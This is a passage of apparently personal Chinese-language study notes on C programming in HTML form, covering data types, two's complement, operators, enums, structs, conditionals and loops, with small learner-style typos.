x（X）：输出 16 进制（不会自带 0x），x 的大小写决定了输出时的大小写（这点和 % e 一样）</p>\n<p>16 进制两位就是一个字节（8bit）, 即一个 char，经常用于表答二进制 (方便变换)</p>\n<p>8 进制是因为以前有 12 位的电脑，用 8 进制表达方便，现在一般用于单片机</p>\n<h4 id=\"三关系运算\"><a class=\"anchor\" href=\"#三关系运算\">#</a> 三。关系运算</h4>\n<p><strong>运算符：</strong></p>\n<p>+，-，/，*：略         // 当 +- 作为单目运算符时 (表示正负)，优先级最高且只能在后面。</p>\n<p>%：取余                    // 要获取一个运算的整数部分，直接整数运算，要获得余数，则取余。</p>\n<p>=：赋值                     // 在 C 中这是也是一个运算符有输出，唯一的自右向左。a=b=6 实际上是 a=(b=6)</p>\n<p>​                                      也就是说 b=6 的输出值其实就是 6</p>\n<blockquote>\n<p>#可以一行定义多个同类型的变量用 &quot;,&quot; 隔开。</p>\n<p>#不要嵌套赋值，belike:r=(r=r+3)*6*(r=r+4)</p>\n</blockquote>\n<h4 id=\"三五复合赋值\"><a class=\"anchor\" href=\"#三五复合赋值\">#</a> <strong>三。五. 复合赋值</strong></h4>\n<p>++/--（递增 / 递减，这属于单目运算符）</p>\n<p>count++/-- 实际上是 count=count+/-1</p>\n<p>前缀时 (++/--a): 此句就已经是 a+/-1</p>\n<p>后缀时 (a++/--): 此句输出还是 a，此句结束后 a+/-1</p>\n<h4 id=\"四变量与常量\"><a class=\"anchor\" href=\"#四变量与常量\">#</a> <strong>四。变量与常量</strong></h4>\n<p>变量类型一旦定义就无法改变            // 没有初始值时是乱码（原来内存里的不知道什么玩意儿）</p>\n<p>常量一旦定义无法改变（const int）<em>// 通常全大写以区分</em></p>\n<blockquote>\n<p>#定义时可以有运算</p>\n</blockquote>\n<h4 id=\"五变量类型\"><a class=\"anchor\" href=\"#五变量类型\">#</a> 五。变量类型</h4>\n<h4 id=\"总起\"><a class=\"anchor\" href=\"#总起\">#</a> 总起</h4>\n<p>表示范围:char&lt;short&lt;int&lt;float&lt;double</p>\n<p>输入输出时的格式化:% d，% ld，% lf</p>\n<p>在内存中的大小：1 字节 (char)（8bit, 即 8 位），2 字节 (short)，4 字节 (int，long (32 位环境))，8 字节 (double，long (64 位环境)，long long)</p>\n<p>//int 的大小其实也是不确定的，它等于电脑 CPU 的寄存器宽度（字长 (cpu 一次可以处理的数据长度) 以及<a href=\"%E5%8D%95%E6%AC%A1%E5%8F%AF%E4%BB%A5%E4%BC%A0%E8%BE%93%E7%9A%84%E9%95%BF%E5%BA%A6%EF%BC%8Ccpu%E4%B8%8E%E5%86%85%E5%AD%98%E4%B9%8B%E9%97%B4\">总线</a>）</p>\n<p>在内存中的表达形式：二进制数 (补码)(int)，编码 (浮点数都是)</p>\n<p>//sizeof ()    用于输出该变量的所占字节数，不能在其中运算 (会被无视)，这是静态的：</p>\n<pre><code>sizeof(a++)=sizeof(a)    //即使在后面printf(&quot;%d&quot;,a)输出也还是a而不是a+1\nsizeof(a+1.0)//输出是8，因为整数和浮点数运算前会转换成浮点数，所以是浮点数的8\n               这不意味着有进行运算，只是判断了最后还是double类型而已\n</code></pre>\n<h5 id=\"1整数int看编译器即一个字bool\"><a class=\"anchor\" href=\"#1整数int看编译器即一个字bool\">#</a> 1. 整数（int (看编译器，即一个字)/bool）</h5>\n<p><strong>一般用 int</strong></p>\n<p>是有范围的，还有 short (-32768-32767)，long，long long int (C99)</p>\n<p>// 如果读取到负数，处理时又不能带符号，最后还要输出。那么可以单独 printf 一个负号，然后 x=-=x</p>\n<p>//bool 是人为定义的，它只存在于 C99，即布尔量</p>\n<blockquote>\n<p>整数的内部表达：</p>\n<p>18-------00010010</p>\n<p>三种方案：</p>\n<p>1. 特殊标志（用第一位为 1 来代表负数运算时遇 + 则 -，乘除保留或变 0）</p>\n<p>2. 取中间数，即 1000000 表示 0，更大为正，反之为负</p>\n<p>3. 补码（其实就是溢出丢掉从头再来 8bit 当进到下一位时，会舍弃第九位的 1）</p>\n<p>11111111（255，当作补码时为 - 1，因为 + 1=0）这样的好处是可以直接运算</p>\n<p>// 对于二进制一个数的补码是 2&lt;sup&gt;n&lt;/sup&gt;-1</p>\n</blockquote>\n<p>对于一个字节的变量（char）：</p>\n<p>000000000：0</p>\n<p>111111111-10000000=-1~-128（补码）</p>\n<p>000000001<sub>01111111=1</sub><strong>127</strong>（少一位是因为 0 也要占一个表示方法，一共 2&lt;sup&gt;n&lt;/sup&gt;）</p>\n<p>// 由于 - 128 与 127 在二进制的表示上是连在一起的，所以：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> a<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a<span class=\"token operator\">-=</span><span class=\"token number\">1</span>                  <span class=\"token comment\">// 此时输出的 a=127</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">char</span> b<span class=\"token operator\">=</span><span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>b<span class=\"token operator\">+=</span><span class=\"token number\">1</span>                  <span class=\"token comment\">// 此时输出 b=-128</span></pre></td></tr></table></figure><p>这个循环是：</p>\n<p>-1<sub>0</sub>......<sub>127</sub>-128<sub>......-1</sub>0</p>\n<p>对于 unsigned char:</p>\n<p>0-255-0-255</p>\n<p>布尔类型 (bool)</p>\n<p>需要 #include&lt;stdbool.h&gt;, 但实际上不会输出所谓的 true 或者 false, 本质上还是 1/0</p>\n<hr />\n<h5 id=\"2浮点数floatdouble\"><a class=\"anchor\" href=\"#2浮点数floatdouble\">#</a> 2. 浮点数（float,double）</h5>\n<p>一般用 double</p>\n<p>** 精确计算不能使用浮点数！！！** 只能用整型或者 bcd 码</p>\n<blockquote>\n<p>这种码只用 4bit（2^4=16）, 也只表示 0~9, 它通过拼凑来得到数字，由于是表示 10 进制数，二进制运算时的结果可能要修正， 修正的规则是：当两个 BCD 码相加，如果和等于或小于 1001（10 进制的 9），无需修正。如果相加之和在 1010 到 1111 (即十六进制数 0AH～0FH) 之间，则需加 6 进行修正；如果相加时，本位产生了进位，也需加 6 进行修正。这样做的原因是，机器按二进制相加，所以 4 位 [二进制数相加时，是按 &quot;逢十六进一&quot; 的原则进行运算的，而实质上是 2 个十进制数相加，应该按 &quot;逢十进一&quot; 的原则相加，16 与 10 相差 6，所以当和超过 9 或有进位时，都要加 6 进行修正。</p>\n</blockquote>\n<p>可以表示 +/-inf（无穷大 / 小，实际上是越界无法表达），nan（无效数字，比如 0/0，如果用整数，会报错，而浮点不会，只会输出 nan）</p>\n<p>带小数部分，有 longdouble（C99）</p>\n<p>float (4 字节，字长 32)：<strong>有效数字</strong> 7 位，在 0 周围 10&lt;sup&gt;-38&lt;/sup &gt; 里无法表示</p>\n<p>double (8 字节，字长 64)：<strong>有效数字</strong> 15 位，在 0 周围 10&lt;sup&gt;-308&lt;/sup &gt; 里无法表示</p>\n<p>// 浮点数中的 0 是单独拿出来表示的</p>\n<p>浮点数的运算精度 (## 见上):</p>\n<p>在运算超出 float 范围时，编译器会强制将其转换为 double，如果不想要这样，在数字后加 f</p>\n<pre><code>flaot a=1.345f\n</code></pre>\n<p><strong>保留位数会影响结果，因为精度的问题，如果保留位数少，可能四舍五入后还是正确的，但是如果多起来，就会有误差。（注意，实际上内存中的就是不精确的，改变保留位数只是我们自己看的而已 ）</strong></p>\n<hr />\n<blockquote>\n<p>浮点数的内部表达：</p>\n<p>1bit 用于表达正负</p>\n<p>11bit 用于表达指数部分</p>\n<p>剩下的都是分数部分和其他没有利用的部分</p>\n<p>浮点计算是由专用硬件负责的</p>\n</blockquote>\n<hr />\n<h5 id=\"3字符char\"><a class=\"anchor\" href=\"#3字符char\">#</a> 3. 字符（<a href=\"-128-127\">char</a>）</h5>\n<p><strong>也可以是整数类型</strong>，不一定都是字符（没有 “” 的话）</p>\n<blockquote>\n<p>#字符串不能参与和整数或者浮点数的运算。</p>\n</blockquote>\n<p>C 中使用 ASCII 编码所以：49=‘1’</p>\n<p>字符加 n，就直接得到它后面第 n 个字符。</p>\n<p>两个字符相减，可以得到它们之间的距离。</p>\n<blockquote>\n<p><strong>a+'a'-'A' 可以将大写转化为小写</strong></p>\n<p><strong>a+'A'-'a' 可以将小写转化为大写</strong></p>\n</blockquote>\n<p>逃逸字符（\\）：</p>\n<p>\\b : 回退一格，实际上是回去，但是不删除（这取决于终端），但是会用后面直接连接的字符覆盖它（该字符不会再次输出）</p>\n<p>\\t : 到下一个表格位（直接到下一个固定位置）</p>\n<p>\\n,\\r : 换行，回车，这来自于早期打字机，到现在，没什么区别</p>\n<p>getchar (): 读入一个字符，返回一个 intEOF (-1)，表示结束</p>\n<p>使用 Crtl + C 强制结束</p>\n<p>使用 Crtl + D (UNIX)/Z (WIN) 结束并输出 EOF</p>\n<blockquote>\n<p>用户的直接输入实际上都在 shell 的缓冲区，程序运行时根据函数读取缓冲区中的数据 getchar 和 scanf 读取长度时不一样的（这也解释了为什么超出会顺延下去），这个缓冲区会有暂停的地方（用于等待你输入），如果使用了上面的快捷键，那么 shell 才会真正给出停止信号，给出 EOF</p>\n</blockquote>\n<h6 id=\"杂项\"><a class=\"anchor\" href=\"#杂项\">#</a> 杂项</h6>\n<hr />\n<p>#整数之间的运算会直接舍弃所有小数部分，在计算过程中也是，但是整数与浮点数运算时，</p>\n<hr />\n<p><strong>整数会被转化为浮点数参与运算</strong>                // 但它还是整数，有时还会特意乘 1.0 来转化</p>\n<p>​                                                                        (不如直接 double)</p>\n<hr />\n<p>// 初始化时，浮点数应是 0.0</p>\n<p><strong>如果想要被当作纯二进制来看待，要写为：unsigned char（即不用补码）</strong></p>\n<p><strong>这样表示范围就会变成 0~255，但是，此时不能表达负数</strong></p>\n<p>EX1. 断点</p>\n<p>断点的一行是未被执行的。可以将鼠标移动到变量上查看此时该变量的值。  // 要调试运行</p>\n<p>EX2. 交换变量（a,b）</p>\n<p>t=a,a=b,b=t</p>\n<p>// 整数类型除法会直接舍弃小数，可以用于整数求逆</p>\n<h5 id=\"4指针单独放在下面\"><a class=\"anchor\" href=\"#4指针单独放在下面\">#</a> 4. 指针（单独放在下面）</h5>\n<h5 id=\"5自定义类型\"><a class=\"anchor\" href=\"#5自定义类型\">#</a> 5. 自定义类型</h5>\n<h6 id=\"枚举\"><a class=\"anchor\" href=\"#枚举\">#</a> 枚举</h6>\n<p>用于定义一些名字，而不用 const int 来：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">enum</span> 枚举类型名字，可不写<span class=\"token punctuation\">&#123;</span>名字<span class=\"token number\">0</span>，名字<span class=\"token number\">1.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>，Number<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 这些都是常量，操作时默认 int 且从 0 开始 (所以后的 number 就真的是这个枚举的有效数量，有个套路，见下),enum 本身不是一种变量类型（但是本质上是 int），它是声明一种变量类型</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>要更改数值</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token class-name\">a</span><span class=\"token punctuation\">&#123;</span>RED<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>YELLOW<span class=\"token punctuation\">,</span>GREEN<span class=\"token operator\">=</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>NumCOLORS<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token class-name\">color</span> <span class=\"token punctuation\">&#123;</span>red<span class=\"token punctuation\">,</span>yellow<span class=\"token punctuation\">,</span>green<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">enum</span> <span class=\"token class-name\">color</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 使用这个类型时，前面要加 enum（C++ 不用）</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span> <span class=\"token punctuation\">(</span>viod<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">enum</span> <span class=\"token class-name\">color</span> t<span class=\"token operator\">=</span>red<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span>，<span class=\"token operator\">&amp;</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">enum</span> <span class=\"token class-name\">color</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span>\t<span class=\"token comment\">// 输出还是 1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>自动计数的枚举：</p>\n<p><img loading=\"lazy\" data-src=\"1729513141155.png\" alt=\"1729513141155\" /></p>\n<p>0 这里也能看出，实际上枚举很少作为类型使用，它作用在于：</p>\n<ol>\n<li>\n<p>枚举可以为一组整数常量赋予有意义的名称，使得代码更易于理解。例如，用 <code>enum Weekday &#123;MONDAY, TUESDAY, WEDNESDAY, THURSDAY, FRIDAY, SATURDAY, SUNDAY&#125;;</code>  定义了一周的天数。在代码中使用 <code>MONDAY</code>  比直接使用数字 0（假设周一被映射为数字 0）更直观地表示星期一，提高了代码的可读性和可维护性。</p>\n</li>\n<li>\n<p>通过枚举定义的变量只能取枚举中定义的特定值，编译器可以在编译时进行类型检查，防止意外地为变量赋予不合法的值。例如，如果定义了一个枚举类型 <code>enum Color &#123;RED, GREEN, BLUE&#125;</code> ，那么一个声明为该枚举类型的变量就只能被赋值为 <code>RED</code> 、 <code>GREEN</code>  或 <code>BLUE</code>  这三个值之一，而不能被赋予其他任意整数值。</p>\n</li>\n<li>\n<p>集中管理常量：</p>\n<p>当有一组相关的常量需要在程序中多处使用时，使用枚举可以将这些常量集中定义在一处，便于管理和修改。如果需要修改某个常量的值，只需要在枚举定义处进行修改，而不需要在代码中逐个查找和修改使用该常量的地方。</p>\n<p>例如，如果要修改表示一周中某一天的常量值，只需要在枚举定义中修改相应的枚举值，而不需要在整个程序中搜索并修改所有使用该常量的地方。</p>\n</li>\n<li>\n<p>易于扩展：</p>\n<p>如果需要在现有枚举中添加新的常量，只需要在枚举定义中添加新的枚举值即可，不会影响到已有的代码逻辑。例如，在 <code>enum Color &#123;RED, GREEN, BLUE&#125;</code>  的基础上，如果需要添加一个新的颜色 <code>YELLOW</code> ，只需要将枚举定义修改为 <code>enum Color &#123;RED, GREEN, BLUE, YELLOW&#125;</code> ，而使用该枚举的代码无需进行大规模修改。</p>\n</li>\n</ol>\n<h6 id=\"结构体\"><a class=\"anchor\" href=\"#结构体\">#</a> 结构体</h6>\n<p>格式：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> 标签 <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">char</span> b<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">float</span> c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>（其他有效变量定义，也可以是其他结构体）</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span>  结构变量（可以不只定义一个）<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 一般三者至少出现俩</span></pre></td></tr></table></figure><p>互相包含的结构体，要进行不完整声明：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">B</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 对结构体 B 进行不完整声明</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 结构体 A 中包含指向结构体 B 的指针</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">A</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">B</span> <span class=\"token operator\">*</span>partner<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 结构体 B 中包含指向结构体 A 的指针，在 A 声明完后，B 也随之进行声明</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">B</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">A</span> <span class=\"token operator\">*</span>partner<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>即使两个结构体的成员一样，也会被当作两个不同的（前提是标签和结构变量要有不同）</p>\n<p>使用：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">Simple</span> t1<span class=\"token punctuation\">,</span> t2<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>t3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 分别表示一个结构体，结构体数组，指向该结构体的指针</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>也就是说<span class=\"token operator\">*</span>t3可以指向t1</pre></td></tr></table></figure><p>与 typedef 连用：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">int</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">char</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">double</span> c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span> Simple2<span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 注意，这里的 Simple2 是别称，结构体三者只出现了一个</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Simple2 u1<span class=\"token punctuation\">,</span>u2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token operator\">*</span>u3</pre></td></tr></table></figure><h5 id=\"ex\"><a class=\"anchor\" href=\"#ex\">#</a> EX</h5>\n<h6 id=\"ex整数求逆\"><a class=\"anchor\" href=\"#ex整数求逆\">#</a> EX 整数求逆</h6>\n<ul>\n<li>\n<p>如果 %10，会得到个位数</p>\n</li>\n<li>\n<p>如果 / 10，会去掉个位数</p>\n<p>当去掉一个个位数后，会有新的一个个位数（原来的十位数），可以再 %10 读取</p>\n<p>C 中不会自动换行，所以 while 中直接 printf 出来，连起来的就刚好是逆向的</p>\n<p>但是 0 在开头也会输出。如果不要，那么用 ret*=10+a (读取的数) 的循环顶位，再输出。（0*10=0, 所以在读取到第一位有效数字前的 0 不会被输出，在之后的则有 * 10 顶出个位来加）</p>\n</li>\n</ul>\n<p>如果要正序且末尾有 0，那么只能使用 i-- 的方法，这需要知道是几位数。</p>\n<p>这是不能判断原数字，而是那个 10&lt;sup&gt;n&lt;/sup&gt;,n 可以先用 / 那个数读取长度，这时要用 pow (), 当然。也可以在读取循环时顺便来个变量 * 10</p>\n<p>// 这里使用 while 代替 do-while，虽然 mask 是对的（直接加会因为 do-while 的无条件执行一次而多 10 倍，当然，可以事后 / 10），但是读取后原数没了，所以有了 t</p>\n<h6 id=\"ex类型转化\"><a class=\"anchor\" href=\"#ex类型转化\">#</a> EX 类型转化</h6>\n<p>所有的类型转化都只是在运算中，不会改变这个变量以及它本身的类型</p>\n<p><strong>自动：</strong></p>\n<p>当运算符两边不一致时，会自动传化为较大的类型:</p>\n<p>char--short--int--long--long long</p>\n<p>int--float--double</p>\n<p>但是对于 printf（不包括 scanf）:</p>\n<p>小于 int 都会变成 int</p>\n<p>float 都会变成 double</p>\n<p><strong>强制：</strong></p>\n<p>优先级高于所有其他运算</p>\n<p>(int) 32     // 注意安全性，不要越界</p>\n<h4 id=\"六条件判断ifswitch\"><a class=\"anchor\" href=\"#六条件判断ifswitch\">#</a> 六。条件判断（if/switch）</h4>\n<h5 id=\"1if-else\"><a class=\"anchor\" href=\"#1if-else\">#</a> 1.if-else</h5>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>x<span class=\"token operator\">></span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>代码<span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>x<span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>代码<span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>代码<span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>级联 if-else：</p>\n<p>必需范围从大到小，因为实际执行的只有一个，而且顺序执行。</p>\n<p>如果都要判断，要用多个 if（能不用就不用，会多次判断）</p>\n<p>// 不同于 python，c 中的 if，else 都是就近匹配，不是依赖缩进，所以最好加上大括号</p>\n<h5 id=\"2switch-case\"><a class=\"anchor\" href=\"#2switch-case\">#</a> 2.switch-case</h5>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>type<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>         <span class=\"token comment\">//type 必须是整数类型</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">case</span> 常量<span class=\"token operator\">:</span>              <span class=\"token comment\">// 这个常量可以是常数，也可以是常数计算的表达式</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>xxx                      C99中还可以用定义的常量</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">case</span> 常量<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>xxx</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">default</span><span class=\"token operator\">:</span>               <span class=\"token comment\">// 当上述一个都没有时跳转</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>xxx</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span>                      <span class=\"token comment\">// 这时相当于一个级联 if</span></pre></td></tr></table></figure><p>switch 本质上是一种跳转，如果不 break，会直接向下执行，而且</p>\n<p>这种跳转只有一次，跳完后所以 case 都当作不存在。</p>\n<p>（break 会直接跳出整个 switch）</p>\n<p>ps：比较像批处理中的标签一样的玩意儿（？）</p>\n<h4 id=\"七循环forwhile\"><a class=\"anchor\" href=\"#七循环forwhile\">#</a> 七。循环 (for/while)</h4>\n<h5 id=\"1while\"><a class=\"anchor\" href=\"#1while\">#</a> 1.while</h5>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>条件<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>循环体                         </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 只要条件依然满足，就会循坏，不会执行下面的代码</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">//if 只有一次判断，而 while 有多次</span></pre></td></tr></table></figure><p>在调试时，可以随便在 while 中 printf 些什么，用于直观判断运行情况，最后记得注释掉就行。</p>\n<p>数位数的算法：</p>\n<p>1. 用户输入 x</p>\n<p>2. 初始化 n=0</p>\n<p>3.n++</p>\n<p>4. 如果 x&gt;0，回到 3</p>\n<p>5. 否则 n 为结果</p>\n<p>// 一般来说，在进入 while 前，循环体要先执行一次，这样才会是 “循环”，这就是：</p>\n<p>do-while 循环</p>\n<pre><code>do\n&#123;  \n循环体\n&#125;while(循环条件)；    //先执行一次，然后判断\n//不要忘记封号          也可以说是先执行，再判断，while则反之\n</code></pre>\n<p>也就是说，do-while 至少执行一遍，while 可能一遍都不做</p>\n<p>EX:rand () 可以召唤随机整数，使用方法：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;time.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">srand</span><span class=\"token punctuation\">(</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span> a<span class=\"token operator\">=</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">100</span><span class=\"token operator\">+</span><span class=\"token number\">1</span>   <span class=\"token comment\">// 这使得数在 100 以内</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td 